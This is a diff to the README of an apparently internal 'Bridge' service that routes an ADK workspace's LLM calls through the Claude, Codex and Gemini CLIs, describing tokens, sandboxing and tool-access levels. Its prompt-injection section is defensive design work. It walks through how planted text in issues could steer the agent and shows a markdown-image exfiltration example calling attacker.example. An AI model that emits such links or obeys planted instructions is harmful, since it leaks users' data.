@@ -76,6 +76,103 @@ the image does; the CLIs themselves never run as root.
 What is still shared: the container's network and CPU/memory. For hard isolation between mutually
 distrusting people, run one Bridge per person or team.
 
+## The Bridge as the AI of the whole app
+
+Besides chats, the Bridge can answer as the **LLM of an ADK workspace**, in place of an API key. In
+**Connect**, the Claude, OpenAI and Gemini cards have an **API Key | AI CLI** switch. With
+**AI CLI** and a Bridge configured, every agent, the playground and every other feature that asks
+a model goes through the CLI in the Bridge, and answers stream as the CLI writes them. Nothing
+else changes for the user, and it turns on by itself when `BRIDGE_SHARED_TOKEN` is set.
+
+```text
+ADK API ──POST /llm/stream (SSE)──▶ Bridge ──▶ claude / codex / gemini
+        ◀── delta, usage, done ───
+```
+
+- **Each workspace signs the CLI in with its own token.** In the card, the **CLI token** field takes
+  the same thing `/auth` does (the table above: `claude setup-token`, `~/.codex/auth.json` or an
+  API key). ADK keeps it encrypted, like any integration secret, and sends it on each request; the
+  Bridge stores it encrypted too, under an identity of its own for that workspace
+  (`llm:<workspace id>`). A workspace never uses another workspace's account, or a Telegram
+  member's. Replace the token in the card and the Bridge replaces it. A login file is rewritten
+  only when the token changes, so the CLI's own refreshed tokens are not overwritten.
+- **No built-in tools, and the ADK's own tools by default.** An agent's prompt carries text
+  nobody vetted (documents, issues, chat history), so the CLI gets no shell and no file access:
+  Claude runs with no built-in tools, no user MCP servers and no user settings, Codex in a
+  read-only sandbox. Gemini's own tools are not restricted, so for Codex and Gemini the workspace
+  members should be people you trust with this container. What the CLI does get, with nothing to
+  set up, is the ADK MCP server: see [The ADK tools of the CLI](#the-adk-tools-of-the-cli).
+- **Same isolation as chats:** its own OS user, HOME and an empty working directory per request,
+  the rules against prompt injection ahead of the agent's own instruction, and the secrets of the
+  workspace and of the Bridge masked in everything that comes back, even when a CLI writes one in
+  two pieces.
+- **Limits:** four CLI processes at once, the rest wait; `BRIDGE_LLM_TIMEOUT_MS` (3 minutes by
+  default) per answer, unlike chats, which may run for `BRIDGE_RUN_TIMEOUT_MS`. Images are not
+  accepted. Closing the request stops the CLI.
+- **Test Connection** in the card asks for a one-word answer, so it also proves the token works.
+
+### The ADK tools of the CLI
+
+With `ADK_MCP_URL` set on the API (the same address `/mcp adk` uses), every run of an agent
+through an AI CLI, in the Bridge or on the machine of the API, can use the ADK tools: issues, Brain,
+tests and the rest of what the MCP server offers. Nobody configures the MCP server in the CLI.
+
+- **As the user who asks.** ADK issues an access token of that user ("ADK AI CLI", valid for one day,
+  kept in memory and reused for 12 hours) and the run acts with their permissions in that
+  workspace. The MCP session is pinned to the workspace through `?workspace=<id>` in the URL, and
+  the API still checks on every call that the user belongs to it.
+- **Never for a Brain question.** Those are answered from the documents alone and get no tools.
+
+#### Prompt injection: what the CLI can do is limited by the server
+
+The CLI reads text nobody vetted (issues, documents, comments) and acts with the user's rights, so
+text planted there may try to steer it. Telling the model not to obey is not enough, so the limits
+are enforced where the model cannot change them: the MCP URL is in the CLI's own config, and the
+MCP server decides the tools of each connection from it (`?profile=`), the same for every CLI.
+The AI CLI form has **ADK tools for the CLI**, with four levels:
+
+| Level                      | Tools (of 278) | What it leaves out                                                                                                                                              |
+| -------------------------- | -------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| **Standard** (the default) | 147            | Accounts and access tokens, integration keys, members and permissions, notifications to others, development sessions that run code, every tool that deletes, and every tool that reaches a system outside ADK (running E2E or API tests, publishing, syncing) |
+| **Read only**              | 84             | All of the above, and every tool that changes data. The token itself can only read                                                                              |
+| **Full access**            | 278            | Nothing: what the user may do. An explicit choice, with a warning in the form                                                                                   |
+| **Off**                    | 0              | Everything                                                                                                                                                      |
+
+Standard is what turns "the agent was talked into something" from a breach into an annoyance: it
+cannot read a key, change who has access, delete data, run code or send data to an address of the
+attacker's choosing. Real work (issues, Brain, specs, test plans, designs, release notes) stays
+available. Use *Full access* only in workspaces where everything the agent reads is trusted.
+
+Two more measures apply to every run that was given tools:
+
+- **No images in the answer.** The screen renders Markdown, and an image such as
+  `![x](https://attacker.example/?q=<data>)` is fetched the moment the answer is shown, with no
+  click. ADK removes images (Markdown, by reference and HTML) from such answers, also while they
+  stream, and keeps the alt text. It also masks the token of the tools if the model repeats it.
+- **The instruction** tells the model that what the tools return is data, not orders, and to say
+  what it will change before changing it. It helps, but none of the above depends on it.
+
+What is still possible: inside the standard profile the agent can change data the user can
+change (create or edit issues, documents, plans), and a link written in the answer is shown as a
+link (it is only followed if the user clicks it). Read only closes the first one too.
+- **It never blocks an answer.** If the token cannot be issued the agent answers without tools.
+- **Where it runs.** Claude and Codex through the API's own machine or the Bridge, and Gemini only
+  through the Bridge (its MCP settings live in its HOME, which the Bridge owns per workspace). The
+  MCP server must be reachable from where the CLI runs: in Docker, `ADK_MCP_URL=http://mcp:3333/mcp`
+  (the Compose file already lets the MCP server accept the `mcp` host name).
+- The server is named `adk-tools`, not `adk`: a CLI that remembers an MCP server of the same name
+  as "needs sign-in" never even connects to a new one.
+
+The CLIs are described once, in `apps/Backend/src/modules/agents/adapters/cli-llm/cli-specs.ts`
+(how each one is started and how its output is read). The Bridge keeps a copy in
+`src/vendor/cli-specs.ts`: after changing that file, run `node scripts/sync-cli-specs.mjs` here.
+The tests fail while the two differ.
+
+The API reaches it with `GET /llm/clis?workspaceId=…` (what is installed and whether the workspace
+has a token) and `POST /llm/stream`, both with `Authorization: Bearer $BRIDGE_SHARED_TOKEN`. The
+token travels in the request body, so when the API and the Bridge are not on the same private
+network, put the Bridge behind HTTPS.
+
 ## Commands
 
 In a chat that chose a CLI, any other text is a prompt for it.
@@ -200,6 +297,7 @@ outbound addresses.
 | `BRIDGE_DEFAULT_MODE`   | `auto`             | `safe` or `auto`                                     |
 | `BRIDGE_LANG`           | `pt`               | Language of the Bridge's messages (`pt` or `en`)     |
 | `BRIDGE_RUN_TIMEOUT_MS` | `1800000`          | A run that takes longer is stopped                   |
+| `BRIDGE_LLM_TIMEOUT_MS` | `180000`           | Longest one answer for the ADK's AI CLI option may take |
 | `BRIDGE_CUSTOM_CLIS`    | none               | Extra CLIs, see below                                |
 
 ### Standalone mode
